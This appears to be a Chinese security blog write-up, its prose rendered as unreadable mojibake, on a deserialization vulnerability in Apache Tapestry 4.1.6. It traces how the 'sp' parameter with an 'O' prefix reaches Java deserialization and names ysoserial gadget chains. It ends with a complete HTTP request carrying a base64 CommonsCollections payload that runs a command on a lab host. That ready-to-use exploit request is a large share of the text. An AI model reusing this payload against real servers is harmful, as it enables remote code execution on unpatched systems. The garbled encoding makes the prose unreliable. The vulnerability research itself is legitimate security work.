# tapestry4ååºåˆ—åŒ–æ¼æ´å¯»æ‰¾ä¹‹æ—…
## å‰è¨€
æŸæ¬¡å¸ˆå‚…ä»¬åœ¨hvvï¼Œæ‰¾åˆ°ä¸€ä¸ªç½‘ç«™å‘ç°äº†apache çš„tapestryæ¡†æ¶ï¼Œç‰ˆæœ¬å·æ˜¯4.1.6ã€‚å…³äºtapestry 4.1.6æ˜¯tapestry4çš„æœ€åä¸€ä¸ªç‰ˆæœ¬ï¼Œä¸€ä¸ªå¾ˆæ—§çš„æ¡†æ¶ï¼Œåç»­å°±åªæœ‰tapestry5è¿˜åœ¨ç»´æŠ¤äº†ã€‚ç½‘ä¸Šèƒ½æ‰¾åˆ°çš„å…³äºtapestryååºåˆ—åŒ–çš„pocçš„éƒ½æ˜¯å…³äºtapestry5çš„ï¼Œè¿™ä¸¤ä¸ªå¤§ç‰ˆæœ¬ä¹‹é—´åº”è¯¥æœ‰å¾ˆå¤§çš„å·®åˆ«ã€‚åˆšå¼€å§‹çš„æ—¶å€™æˆ‘ä¹Ÿæ‹¿ç€tapestry5çš„å¤ç°äº†åŠå¤©ï¼Œå‘ç°å¾ˆå¤šåœ°æ–¹å’Œç›®æ ‡ç³»ç»Ÿä¸ç¬¦åˆï¼Œåæ¥æ‰å‘ç°tapestry4å’Œtapestry5å¤©å·®åœ°åˆ«ã€‚

åœ¨googleä¸Šæ‰¾äº†åŠå¤©ä¹Ÿæ²¡æœ‰å‘ç°æœ‰ä»»ä½•å¯ä»¥ç›´æ¥ç”¨çš„pocï¼Œå…³äºtapestry4çš„ååºåˆ—åŒ–æ¼æ´åªå‘ç°äº†æœ‰ä¸‹é¢è¿™æ®µæè¿°ã€‚
![](images/1.png)

Apacheè²Œä¼¼ä¹Ÿè¯´ä»–ä¸å¹²äº†ï¼Œä¸ä¿®äº†ã€‚å› ä¸ºtapestry4å·²ç»è¢«å¼ƒç”¨äº†ï¼Œç½‘ä¸Šä¹Ÿæ‰¾ä¸åˆ°ç‰¹åˆ«å¤šçš„èµ„æ–™ã€‚é‚£å’‹åŠï¼Ÿåªèƒ½ç¡¬ç€å¤´çš®ï¼Œæ’¸ä¸ªæºç äº†ã€‚ğŸ¤“
- - - -
## æºç åˆ†æ
ç”±äºå¯¹è¿™ä¸ªæ¡†æ¶å®Œå…¨ä¸äº†è§£ï¼Œè€Œä¸”å½“æ—¶æ—¶é—´æœ‰é™ï¼Œå¤šæ¬¡æ­å»ºéƒ½æŠ¥é”™ï¼Œé‚åœ¨githubä¸Šæ‰¾äº†ä¸€ä¸ªä¿åŠ åˆ©äºšè€å“¥å†™çš„tapestry4é¡¹ç›®ï¼Œæˆ‘ä»¬ç§‰æŒç€èƒ½ç”¨å°±è¡Œçš„åŸåˆ™ã€‚tomcatèµ·ğŸ‘¾

- - - -
### å…¥å£
åç¼–è¯‘å‡º`tapestry-framework-4.1.6.jar`æºç ï¼Œæ–¹ä¾¿æœç´¢æŸ¥çœ‹ã€‚
æœç´¢ä¸€ä¸‹è·å–åˆ°requestä¸­spå‚æ•°çš„åœ°æ–¹ï¼Œè²Œä¼¼ä¸€ä¸‹å°±æ‰¾åˆ°å…¥å£äº†ã€‚
`org.apache.tapestry.services.impl.LinkFactoryImpl#extractListenerParameters`ï¼Œå¾ˆæ ‡å‡†çš„è·å–å‰ç«¯ä¼ å…¥çš„spå‚æ•°ã€‚
![](images/2.png)

å‘é€å¦‚ä¸‹çš„è¯·æ±‚åŒ…ï¼š
![](images/3.png)

ä»doPostä¸€è·¯è·Ÿåˆ°`org.apache.tapestry.engine.AbstractEngine#service`
ä¼šæ ¹æ®å‚æ•°ä¸­çš„serviceå‚æ•°å€¼è°ƒç”¨åˆ°ç›¸åº”çš„serviceçš„serviceæ–¹æ³•

![](images/4.png)

æˆ‘ä»¬è¯·æ±‚çš„serviceä¸ºdirectï¼Œæ‰€ä»¥è¿›å…¥äº†directServiceçš„serviceæ–¹æ³•ä¸­ 

![](images/5.png)

ç´§æ¥ç€å°±è¿›å…¥åˆ°`org.apache.tapestry.services.impl.LinkFactoryImpl#extractListenerParameters`ä¸­
![](images/6.png)
è·å–åˆ°spçš„å‚æ•°ï¼Œè¿›å…¥`org.apache.tapestry.util.io.DataSqueezerImpl#unsqueeze(java.lang.String)`çš„æ–¹æ³•

![](images/7.png)
è·å–åˆ°spå‚æ•°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œåˆ¤æ–­æ˜¯å¦å·²Xå¼€å¤´ï¼Œç„¶åä»¥ASCIIç å‡å»33ã€‚ä½œä¸ºå‚æ•°è·å–åˆ°`this._adaptorByPrefix`çš„å…¶ä¸­ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶å»æ‰§è¡Œè¯¥ç±»çš„unsqueezeæ–¹æ³•
![](images/8.png)


æˆ‘ä»¬éœ€è¦çš„readObjectæ–¹æ³•å°±åœ¨`org.apache.tapestry.util.io.SerializableAdaptor#unsqueeze`ä¸­ã€‚è¯¥ç±»åˆšå¥½ä½äº`this._adaptorByPrefix`ä¸­çš„ç¬¬46æˆ–è€…57ä½ï¼Œç»è¿‡ASCIIçš„è¿ç®—æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§å†™çš„`O`ã€‚è·³è½¬åˆ°æˆ‘ä»¬çš„`org.apache.tapestry.util.io.SerializableAdaptor#unsqueeze`ä¸­å…ˆè¿›è¡Œbase64è§£ç ï¼Œç„¶åä¼šå»æ‰§è¡Œååºåˆ—åŒ–ã€‚

![](images/9.png)

ä»pom.xmlä¸­å¯ä»¥çœ‹åˆ°`Tapestry4`è‡ªå¸¦äº†`commons-fileupload-1.2.1.jar`ï¼Œå¯ä»¥åˆ©ç”¨fileupload1çš„ååºåˆ—åŒ–é“¾è¿›è¡Œå†™æ–‡ä»¶ã€‚
![](images/10.png)
å¯ä»¥ä½¿ç”¨ysoserialç”ŸæˆFileUpload1çš„poc
![](images/14.png)
![](images/11.png)
![](images/12.png)

åœ¨é¶åœºç¯å¢ƒä¸­æ·»åŠ `commons-collections3.1.jar`ä¾èµ–ï¼Œåˆ©ç”¨CommonsCollectionsK3å¼¹ä¸ªè®¡ç®—å™¨
![](images/15.png)

![](images/13.png)

ä½¿ç”¨çš„è¯·æ±‚:
```
POST /app HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1930
Cookie: Idea-f6c80753=e3e1c01e-3ef1-41a1-a4fc-7b04ac32c488


formids=&seedids=ZH4sIAAAAAAAAADWMsQ2AMAwEadiEMkWWgD2i2EJGxI5sCxiK1dgBAqL5v%2BL%2Bz6vr96PbgqFulHGIoaa5VZZShZH9ZfZEjPqwoRkJN6pPEPwKtJWTr60BLStV%2F0xI%2Fj6rLJh9BPJJtAzxBlUfINJ%2BAAAA&component=projectEditForm&page=Home&service=direct&submitmode=&submitname=&sp=OrO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAABdnNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB%2BAAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo%2F2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB%2BABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5%2Bkde0cCAAB4cAAAAAF0ABJvcGVuIC1hIGNhbGN1bGF0b3J0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAAAeHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAABdHg%3D
```
- - - -
## æ€»ç»“
çœ‹äº†å¥½ä¹…ï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚

![](images/cai.jpeg)